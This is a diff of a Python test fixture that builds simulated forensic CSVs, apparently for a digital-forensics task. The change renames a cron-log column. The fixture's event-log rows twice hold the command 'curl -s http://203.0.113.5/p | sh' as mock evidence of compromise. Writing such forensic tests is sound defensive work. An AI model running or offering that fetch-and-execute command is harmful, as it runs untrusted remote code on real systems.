@@ -72,7 +72,7 @@ def tasks(tmp_path) -> list[dict]:
            "", "2026-05-19 21:00:00", "", ""],
           ["/usr/bin/curl", "4", "r/rrwxr-xr-x", "0", "0", "9", "", "2025-01-01 00:00:00", "", ""]])
     _csv(ev, "CSVs/EventLogs/art_log_cron.csv",
-         ["timestamp", "time_utc", "kind", "user", "detail", "suspicious"],
+         ["timestamp", "timestamp_utc", "kind", "user", "detail", "suspicious"],
          [["", "2026-05-19 10:00:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
           ["", "2026-05-19 10:05:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
           ["", "2026-05-19 10:05:00", "reload", "jdoe", "crontabs/jdoe", ""]])
